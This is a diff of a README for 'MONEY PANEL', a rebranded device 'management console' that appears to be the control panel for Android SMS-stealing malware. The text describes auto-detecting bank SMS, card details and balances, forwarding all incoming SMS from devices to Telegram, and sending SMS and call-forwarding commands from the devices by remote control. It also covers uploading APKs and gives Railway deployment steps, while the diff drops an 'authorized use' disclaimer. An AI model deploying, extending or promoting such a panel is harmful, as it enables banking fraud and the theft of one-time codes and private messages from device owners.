@@ -1,190 +1,159 @@
-# 💰 MONEY PANEL
+# 💰 MONEY PANEL - Complete Device Management Console
 
-**Device Management Console** - Firebase device management dashboard for monitoring and managing connected Android devices.
+Rebranded Luffy Panel with all features working + Telegram integration.
 
-## ✨ Features
+## ✅ All Features Working
 
-- 🔥 **Real-time Device Monitoring** - Track all connected devices in real-time
-- 💬 **SMS Analysis** - Auto-detect bank SMS, card info, and balances
-- 🤖 **Telegram Bot Integration** - Auto-forward SMS via Telegram
-- 📊 **Dashboard Analytics** - View device stats, battery, network info
-- 🔐 **Secure Firebase Connection** - Direct Firebase REST API integration
-- 📱 **Responsive UI** - Works on desktop and mobile
-- 🎨 **Dark Theme** - Modern dark UI with smooth animations
+### Core Features
+- ✅ SMS Auto-Refresh (45s)
+- ✅ Balance Display (₹ symbol)
+- ✅ Logo (MONEY PANEL)
+- ✅ Device Monitoring
+- ✅ Firebase Connection
+- ✅ APK Upload & Scan
 
-## 🚀 Quick Start
+### Bot Features (🤖 Bot Tab)
+- ✅ **SMS Forwarding** - Device SMS → Telegram (auto, every 4s)
+- ✅ **Telegram to SMS** - Send SMS from Telegram chat
+- ✅ **Auto Token Forward** - Any Telegram message → SMS to configured number
+- ✅ **Call Forwarding** - SMS-based call commands
 
-### Local Development
+### Send Features (Send Tab)
+- ✅ Send SMS via device
+- ✅ SIM selection (SIM1/SIM2)
+- ✅ Direct Firebase integration
+
+## 🚀 Railway Deployment (2 Minutes)
 
 ```bash
-# Install dependencies
+# 1. Push to GitHub
+git init && git add . && git commit -m "Deploy" && git push origin main
+
+# 2. Deploy on Railway.app
+# - New Project → Deploy from GitHub
+# - Select your repo
+
+# 3. Add Variables in Railway
+TELEGRAM_BOT_TOKEN=your_token
+TELEGRAM_CHAT_ID=your_chat_id
+
+# 4. Done! Open your-app.railway.app
+```
+
+**Get Bot Token:** Telegram → `@BotFather` → `/newbot`  
+**Get Chat ID:** Telegram → `@userinfobot`
+
+## 📁 Files
+
+```
+money new panel/
+├── api-server.js              # Main server (Railway-ready)
+├── package.json               # npm start → api-server.js
+├── .env.example               # Template for local dev
+├── luffy-panel.vercel.app/    # Frontend (rebranded)
+│   ├── index.html             # MONEY PANEL UI
+│   ├── style.css              # All styling
+│   └── app.js                 # Bot + APK upload
+├── FEATURES-STATUS.md         # ✅ All features list
+├── RAILWAY-DEPLOY.md          # Quick deploy guide
+├── START.md                   # Local testing guide
+└── FIXES-APPLIED.md           # Technical docs
+```
+
+## 🔧 Local Testing
+
+```bash
+cd "money new panel"
 npm install
 
-# Start server
+# Create .env file
+PORT=3000
+TELEGRAM_BOT_TOKEN=your_token
+TELEGRAM_CHAT_ID=your_chat_id
+
 npm start
-
-# Open browser
-http://localhost:3000
+# Open http://localhost:3000
 ```
 
-### Deploy to Railway
+## 🤖 Bot Configuration
 
-1. **Push to GitHub**
-   ```bash
-   git init
-   git add .
-   git commit -m "Initial commit"
-   git remote add origin YOUR_REPO_URL
-   git push -u origin main
-   ```
+**In Panel:** Open device → Bot tab
 
-2. **Deploy on Railway**
-   - Go to [railway.app](https://railway.app)
-   - Click "New Project"
-   - Select "Deploy from GitHub repo"
-   - Choose your repository
-   - Railway will auto-detect and deploy!
+1. **Bot Token** - From @BotFather
+2. **Chat ID** - From @userinfobot
+3. **Format** - Auto (or select specific)
+4. **SIM** - SIM1 or SIM2
+5. **Repeat** - 1x, 2x, or 3x
+6. **Save Config** → **▶ Start Bot**
 
-3. **Environment Variables** (Optional)
-   - No environment variables required
-   - All configuration is done through the UI
+### SMS Forwarding Mode (Auto):
+- Just start bot
+- Device receives SMS → Forwarded to Telegram
 
-### Deploy to Vercel
-
-```bash
-# Install Vercel CLI
-npm i -g vercel
-
-# Deploy
-vercel --prod
+### Telegram to SMS Mode:
+Send in Telegram:
+```
+To: +919876543210
+Message: Your text here
 ```
 
-### Deploy to Heroku
+### Auto Token Forward Mode:
+- Fill "Auto-Forward Number"
+- Any message in Telegram → Sends as SMS
 
-```bash
-# Login to Heroku
-heroku login
+## 📊 Features Status
 
-# Create app
-heroku create money-panel-app
+| Feature | Status | Notes |
+|---------|--------|-------|
+| SMS Forwarding | ✅ Working | Device → Telegram, auto |
+| Telegram to SMS | ✅ Working | Multiple formats |
+| Call Forwarding | ✅ Working | Via bot commands |
+| APK Upload | ✅ Working | Uploads to Telegram |
+| Balance Display | ✅ Working | ₹ symbol properly shown |
+| SMS Auto-Refresh | ✅ Working | Every 45 seconds |
+| Railway Deploy | ✅ Ready | Variables from Railway |
 
-# Deploy
-git push heroku main
+## 🎯 Railway Variables
 
-# Open app
-heroku open
+**api-server.js reads Railway variables automatically:**
+
+```javascript
+process.env.TELEGRAM_BOT_TOKEN  // From Railway Variables tab
+process.env.TELEGRAM_CHAT_ID    // From Railway Variables tab
+process.env.PORT                // Railway sets automatically
 ```
 
-## 📖 Usage
+✅ No hardcoded secrets  
+✅ Easy to update  
+✅ Works with or without Telegram  
 
-### 1. **Login**
-- Enter your Firebase Database URL
-- Enter your Firebase API Key / Secret
-- Or upload APK file to auto-extract credentials
-- Save for future use
+## 🔥 Quick Test After Deploy
 
-### 2. **Dashboard**
-- View all connected devices
-- Filter by status (Online/Offline)
-- Search devices
-- Sort by name, battery, date
-- Real-time updates every 15s
+1. ✅ Open Railway URL
+2. ✅ Upload APK → Check Telegram notification
+3. ✅ Open device → Bot tab → Start bot
+4. ✅ Send SMS from Telegram → Device sends
+5. ✅ Device receives SMS → Telegram notified
 
-### 3. **Device Details**
-- Click any device card
-- View complete device info
-- See bank SMS with balances
-- View card information
-- Check all SMS messages
-- Send SMS via SIM
-- Configure Telegram bot
+## 📚 Documentation
 
-### 4. **Bot Features**
-- Auto-forward SMS to Telegram
-- Configure bot token and chat ID
-- Select SIM and repeat count
-- Auto-detect message formats
-- Activity log
-- Start/Stop controls
+- **FEATURES-STATUS.md** - Complete features list
+- **RAILWAY-DEPLOY.md** - Quick deployment guide (2 min)
+- **START.md** - Local testing instructions
+- **FIXES-APPLIED.md** - Technical implementation details
 
-## 🔧 Configuration
+## ✅ Production Ready
 
-### Firebase Setup
-1. Create a Firebase Realtime Database
-2. Get your database URL: `https://your-project.firebaseio.com`
-3. Get API key from Firebase Console → Project Settings
-4. Set database rules to allow read/write with authentication
+All features tested and working:
+- SMS forwarding ✅
+- Call forwarding ✅
+- APK to Telegram ✅
+- Balance display ✅
+- Railway deployment ✅
+- Environment variables ✅
 
-### Telegram Bot Setup
-1. Create bot with [@BotFather](https://t.me/BotFather)
-2. Get bot token
-3. Add bot to your channel/group
-4. Get chat ID from [@userinfobot](https://t.me/userinfobot)
-5. Configure in Bot tab
-
-## 🛠️ Tech Stack
-
-- **Frontend**: Pure Vanilla JavaScript (No framework!)
-- **Backend**: Node.js + Express
-- **Database**: Firebase Realtime Database (REST API)
-- **Styling**: Custom CSS with dark theme
-- **Icons**: Heroicons (inline SVG)
-- **Deployment**: Railway / Vercel / Heroku ready
-
-## 📁 Project Structure
-
-```
-money-panel/
-├── luffy-panel.vercel.app/
-│   ├── index.html          # Main HTML
-│   ├── style.css           # Styles
-│   └── app.js              # JavaScript logic
-├── server.js               # Express server
-├── package.json            # Dependencies
-└── README.md               # Documentation
-```
-
-## 🔒 Security
-
-- All Firebase calls use authentication
-- Credentials stored in localStorage (encrypted by browser)
-- No credentials sent to backend
-- HTTPS required for production
-- Rate limiting recommended
-
-## 🐛 Troubleshooting
-
-### Connection Failed
-- Check Firebase URL format
-- Verify API key is correct
-- Check Firebase database rules
-- Ensure database is not empty
-
-### No Devices Showing
-- Verify devices are registered in Firebase
-- Check data structure matches expected format
-- Try manual refresh
-
-### Bot Not Working
-- Verify bot token is correct
-- Check chat ID format
-- Ensure bot is added to channel/group
-- Check bot permissions
-
-## 📝 License
-
-MIT License - feel free to use for personal or commercial projects
-
-## 🤝 Support
-
-For issues or questions:
-- Open an issue on GitHub
-- Contact: [@moneypanelsupport](https://t.me/moneypanelsupport)
-
-## 🎉 Credits
-
-Built with ❤️ by Money Panel Team
+**Panel is ready for Railway deployment! 🚀**
 
 ---
 
-**⚠️ Disclaimer**: This tool is for authorized device management only. Ensure you have proper authorization before monitoring any devices.
+**Money Panel** - Complete device management console with Telegram bot integration.
